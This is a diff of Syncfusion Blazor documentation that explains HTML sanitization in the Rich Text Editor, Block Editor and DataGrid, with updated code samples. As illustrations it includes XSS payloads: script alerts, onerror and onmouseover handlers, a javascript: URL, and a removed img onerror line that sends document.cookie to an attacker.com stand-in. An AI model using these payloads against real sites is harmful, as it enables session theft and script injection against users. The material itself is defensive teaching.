@@ -11,15 +11,19 @@ documentation: ug
 
 ## Overview
 
-Input sanitization is a critical security practice in Syncfusion Blazor applications that handle user-generated content. Syncfusion Blazor components include built-in HTML sanitization (enabled by default in most cases) to safely process and render potentially untrusted content. This guide explains how these features work, focusing especially on the **Rich Text Editor**, **Block Editor** (using `EnableHtmlSanitizer` property), and **DataGrid**.
+Input sanitization prevents unsafe HTML and scripts from being executed when an application renders user-generated content. In Blazor, Razor encodes strings by default, and Syncfusion components that work with rich HTML (for example, Rich Text Editor and Block Editor) include a built-in HTML sanitizer to remove dangerous tags, attributes, and URL schemes.
+
+This guide explains Blazor's default Razor encoding for plain text, Syncfusion's built-in HTML sanitizers for rich content (with a focus on the Rich Text Editor and Block Editor), and manual techniques for other components like the DataGrid.
 
 ## What is Input Sanitization
 
-Input sanitization is the process of parsing and filtering HTML content from untrusted sources to remove or escape unsafe tags, attributes, inline scripts, event handlers, and dangerous URLs, while preserving legitimate formatting and safe markup.
+Input sanitization is the process of filtering and cleaning HTML content from untrusted sources. It removes unsafe tags (like `<script>`), inline scripts (JavaScript code embedded directly in HTML attributes), event handlers (such as onclick), and dangerous URLs (malicious 'javascript:' links). Only safe and valid markup is preserved.
+
+For plain text inputs, this often means HTML encoding to escape special characters, preventing interpretation as markup.
 
 ## Why Input Sanitization is important
 
-Blazor applications often accept text input, file uploads, dialog content, and query parameters. Users may intentionally or accidentally submit HTML or script content that may execute unexpectedly when rendered as HTML.
+Blazor applications often accept text input, file uploads, dialog content, and query parameters. Users may intentionally or accidentally submit HTML or script content. This content can execute unexpectedly when rendered as HTML.
 
 If untrusted content is rendered as HTML, it can:              
 
@@ -30,41 +34,25 @@ If untrusted content is rendered as HTML, it can:
 
 Sanitizing user input ensures that only safe and expected values are stored or displayed.
 
-Example:
-
-```
-Unsafe input:
-<script>alert('XSS')</script>
-
-Sanitized output:
-(alert removed)
-```
-
 ## Types of Attacks
 
 | Attack | Description | Prevention |
 |--------|-------------|------------|
-| **Cross-Site Scripting (XSS)** | Attackers insert JavaScript into user-generated content. If rendered as HTML, the script executes in the user's browser. Example: `<script>alert('XSS');</script>` | Enable built-in sanitizer (EnableHtmlSanitizer="true", default in RTE); use HtmlEncode for plain-text inputs.|
-| **HTML Injection** | Attackers insert unauthorized markup that modifies page appearance or user experience. Example: `<iframe src="phish-site.com"></iframe>` (embeds phishing form for credential theft). | Sanitizer removes unsafe tags/attributes; avoid rendering raw HTML from untrusted sources. |
-
-Both attacks rely on causing the application to interpret malicious markup as legitimate HTML. Sanitization removes unsafe tags, attributes, or scripts to prevent such vulnerabilities.
+| **Cross-Site Scripting (XSS)** | Malicious scripts are injected (e.g.,event attributes like onclick, or javascript: URLs) and execute in the user’s browser. Example: `<script>alert('XSS');</script>` | HTML sanitization is enabled by default in Syncfusion components like RTE; use HTML encoding (e.g., HtmlEncoder.Default.Encode()) for plain-text inputs.|
+| **HTML Injection** | Unwanted markup changes layout or behavior (e.g., injecting unexpected `<div>`, `<style>`, or risky attributes). Example: `<iframe src="phish-site.com"></iframe>`. | Built-in sanitizer removes unsafe tags/attributes; avoid rendering raw HTML from untrusted sources. |
 
 ## Built-In Sanitization Features
 
-Several Syncfusion Blazor components include HTML sanitization capabilities to prevent harmful script or markup from being processed. Components that accept or render HTML content such as the Rich Text Editor, Block Editor have built-in `EnableHtmlSanitizer` property to remove unsafe elements before rendering. Other components such as Tooltip, Toast, Dialog, and HTML‑templated controls such as DataGrid also apply the sanitization to ensure user‑provided HTML is safe.
-
-When this property is enabled, the Rich Text Editor component automatically filters out unsafe markup before rendering the content. 
+Several Syncfusion Blazor components include HTML sanitization capabilities to prevent harmful script or markup from being processed. Components that accept or render HTML content such as the Rich Text Editor, Block Editor have built-in `EnableHtmlSanitizer` property to remove unsafe elements before rendering.Components like Tooltip, Toast, and Dialog automatically apply sanitization when rendering HTML templates. For DataGrid, manual encoding is recommended for user-provided content. This ensures that any user provided HTML is safe.
 
 In the example shown, the sanitizer removes embedded scripts and event based attacks to prevent malicious code execution. It strips `<script>` tags, inline event handlers, JavaScript URLs, and dangerous elements like `<iframe>` or `<object>` to ensure that only safe HTML is displayed.
 
-```
-<script>alert('XSS attack!')</script>
-<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
+```html
+<!-- User input -->
+<script>alert('XSS')</script>
 
-Sanitized output:
-
-(alert script removed)
-<img src="x">
+<!-- Sanitized output -->
+(Empty or safe text only)
 ```
 
 ### Rich Text Editor (RTE)
@@ -76,13 +64,21 @@ The Rich Text Editor allows users to input and render HTML content. To prevent u
 
 @using Syncfusion.Blazor.RichTextEditor
 
-<SfRichTextEditor EnableHtmlSanitizer="true">
-</SfRichTextEditor>
+<SfRichTextEditor EnableHtmlSanitizer="true" @bind-Value="Content"></SfRichTextEditor>
+
+@code {
+   
+ private string Content { get; set; } =
+        "<p>Welcome</p><img src=x onerror=\"alert('xss')\"><script>alert('XSS')</script>";
+
+}
 
 {% endhighlight %}
 {% endtabs %}
 
-When enabled the `EnableHtmlSanitizer` property, automatically removes unsafe tags and attributes such as `<script>` tags, event attributes (such as onload, onclick), and other unsafe content before rendering it. This ensures only clean and safe HTML is allowed in the editor.
+When the EnableHtmlSanitizer property is enabled, the Rich Text Editor automatically removes unsafe tags and attributes before rendering the content.
+
+**Disabling the EnableHtmlSanitizer**
 
 To disable the built-in sanitizer (not recommended for untrusted content), set the property to `false`:
 
@@ -90,12 +86,15 @@ To disable the built-in sanitizer (not recommended for untrusted content), set t
 
 @using Syncfusion.Blazor.RichTextEditor
 
-<SfRichTextEditor EnableHtmlSanitizer="false">
-</SfRichTextEditor>
+<SfRichTextEditor EnableHtmlSanitizer="false" @bind-Value="Content"></SfRichTextEditor>
+
+@code {
+    
+private string Content { get; set; } = "<p>Welcome</p><img src=x onerror=\"alert('xss')\"><script>alert('XSS')</script>";
+
+}
 
 {% endhighlight %}
-
-Disabling the sanitizer allows raw HTML to be accepted and rendered; ensure you apply server-side validation or other sanitization when disabling. 
 
 ### Block Editor
 
@@ -104,45 +103,70 @@ The Block Editor allows users to create structured content such as paragraphs, h
 {% tabs %}
 {% highlight razor %}
 
-@using Syncfusion.Blazor.BlockEditor
+@using Syncfusion.Blazor.BlockEditor;
 
-<SfBlockEditor EnableHtmlSanitizer="true">
-</SfBlockEditor>
+<div id="container">
+    <SfBlockEditor Blocks="@BlocksData" EnableHtmlSanitizer="true"></SfBlockEditor>
+</div>
+@code {
+    private List<BlockModel> BlocksData = new()
+    {
+        new BlockModel
+        {
+            BlockType = BlockType.Paragraph,
+            Content = new()
+            {
+                new ContentModel
+                {
+                    ContentType = ContentType.Text,
+                    Content = "<div onmouseover='javascript:alert(1)'>Prevention of Cross-Site Scripting (XSS) </div> <script>alert('hi')</script>"
+                }
+            }
+        }
+    };
+}
 
 {% endhighlight %}
 {% endtabs %}
 
 When the EnableHtmlSanitizer property is enabled, the Block Editor automatically removes unsafe tags and attributes such as `<script>` tags, event attributes (like onload, onclick), javascript: URLs, and other harmful markup before rendering content. This ensures that only clean and trusted HTML remains in the editor output.
 
+**Disabling the EnableHtmlSanitizer**
+
 To disable the built-in sanitizer (not recommended for untrusted input), set the property to false:
 
 {% tabs %}
 {% highlight razor %}
 
-@using Syncfusion.Blazor.BlockEditor
+@using Syncfusion.Blazor.BlockEditor;
 
-<SfBlockEditor EnableHtmlSanitizer="false">
-</SfBlockEditor>
+<div id="container">
+    <SfBlockEditor  EnableHtmlSanitizer="false"></SfBlockEditor>
+</div>
 
 {% endhighlight %}
 {% endtabs %}
-
-Disabling sanitization allows raw HTML to be inserted and rendered by the Block Editor. 
-
+    
 ## How to Sanitize Input in Blazor
 
 When you only need to display plain text (not HTML), the safest approach is to HTML encode user input. Encoding converts characters like <, >, and & into harmless text representations so the browser will not interpret them as HTML or scripts. This ensures that even if the user enters malicious markup, it is displayed as text, not executed.
 
 ```
+
 @using System.Text.Encodings.Web
+
+<p>@encoded</p>  
 
 @code {
     string userInput = "<script>alert('XSS')</script> Hello!";
-    string safeText = System.Net.WebUtility.HtmlEncode(userInput);
+    string encoded = HtmlEncoder.Default.Encode(userInput);
 }
+
+```
 
 Output:
 
+```
 &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; Hello!
 ```
 
@@ -169,13 +193,13 @@ The following example demonstrates sanitizing text before binding it to the Grid
 <div class="input-row">
     <SfTextBox @bind-Value="UserText" Placeholder="Enter text" CssClass="w-100"></SfTextBox>
 
-    <SfButton CssClass="e-primary" OnClick="ProcessInputAsync" Type="Button">
+    <SfButton CssClass="e-primary" OnClick="ProcessInput" Type="Button">
         Submit
     </SfButton>
 </div>
 
 <div class="mt-2">
-<SfGrid @ref="UserGrid" DataSource="Items" AllowPaging="true">
+<SfGrid @ref="UserGrid" DataSource="@Items" AllowPaging="true">
     <GridColumns>
         <GridColumn Field="Content" HeaderText="User Content" Width="200"></GridColumn>
     </GridColumns>
@@ -191,10 +215,9 @@ The following example demonstrates sanitizing text before binding it to the Grid
 
     private void ProcessInput()
     {
-        var cleaned = System.Net.WebUtility.HtmlEncode(UserText);
+        var cleaned =  HtmlEncoder.Default.Encode(UserText);
         Items.Add(new ItemRecord { Content = cleaned });
-        Items = Items.ToList();
-        StateHasChanged();
+        UserGrid.Refresh();
     }
 
     public class ItemRecord
@@ -206,9 +229,9 @@ The following example demonstrates sanitizing text before binding it to the Grid
 {% endhighlight %}
 {% endtabs %}
 
-The encoded value ensures the Grid displays safe text without interpreting any malicious input.
+You can experiment with a working example of encoded DataGrid content in the Syncfusion Blazor Playground:
 
-{% previewsample "https://blazorplayground.syncfusion.com/embed/hXBdDKiCUIgKSIYz?appbar=false&editor=false&result=true&errorlist=false&theme=fluent2" %}
+{% previewsample "https://blazorplayground.syncfusion.com/embed/hXBdDKiCUIgKSIYz?appbar=false&editor=false&result=true&errorlist=false&theme=fluent2"  %}
 
 ## See Also
 
